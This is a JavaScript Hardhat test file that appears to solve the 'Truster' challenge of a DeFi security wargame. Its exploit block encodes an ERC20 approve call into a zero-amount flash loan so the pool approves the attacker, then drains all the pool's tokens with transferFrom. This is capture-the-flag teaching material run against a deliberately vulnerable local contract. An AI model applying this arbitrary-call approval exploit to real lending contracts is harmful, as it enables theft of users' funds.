const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Truster", function () {
    let deployer, attacker

    const TOKENS_IN_POOL = ethers.utils.parseEther("1000000")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, attacker] = await ethers.getSigners()

        const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer)
        const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer)

        this.token = await DamnValuableToken.deploy()
        this.pool = await TrusterLenderPool.deploy(this.token.address)

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL)

        expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)

        expect(await this.token.balanceOf(attacker.address)).to.equal("0")
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const TrusterLenderPoolFactory = await ethers.getContractFactory(
            "TrusterLenderPool",
            attacker
        )
        const DamnValuableTokenFactory = await ethers.getContractFactory(
            "DamnValuableToken",
            attacker
        )

        let pool = TrusterLenderPoolFactory.attach(this.pool.address)
        let token = DamnValuableTokenFactory.attach(this.token.address)

        console.log("Attacker Address:", attacker.address)
        console.log("Pool Address:", pool.address)
        console.log("Token Address:", token.address)

        // function flashLoan(
        //     uint256 borrowAmount,
        //     address borrower,
        //     address target, - token
        //     bytes calldata data - approve(TOKENS_IN_POOL,attacker.address)

        //erc20 approve function signature
        functionSig = "function approve(address spender, uint256 amount)"
        let ABI = [functionSig]
        let regexConst = /function\s*(.*)\s*\(/
        var functionName = regexConst.exec(functionSig)

        console.log("Function Name:", functionName[1])

        let iface = new ethers.utils.Interface(ABI)
        const selector = iface.getSighash(functionName[1])
        let callData = iface.encodeFunctionData(functionName[1], [attacker.address, TOKENS_IN_POOL])

        console.log("Call Data:", callData)

        console.log("Performing flashloan...")
        await pool.flashLoan(0, attacker.address, token.address, callData)
        console.log("Completed flashloan...")

        console.log("Withdrawing from pool...")
        await token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL)
        console.log("Withdraw completed...")

        console.log("Pool Token Balance:", (await token.balanceOf(pool.address)).toString())
        console.log("Attacker Token Balance:", (await token.balanceOf(attacker.address)).toString())
    })

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL)
        expect(await this.token.balanceOf(this.pool.address)).to.equal("0")
    })
})
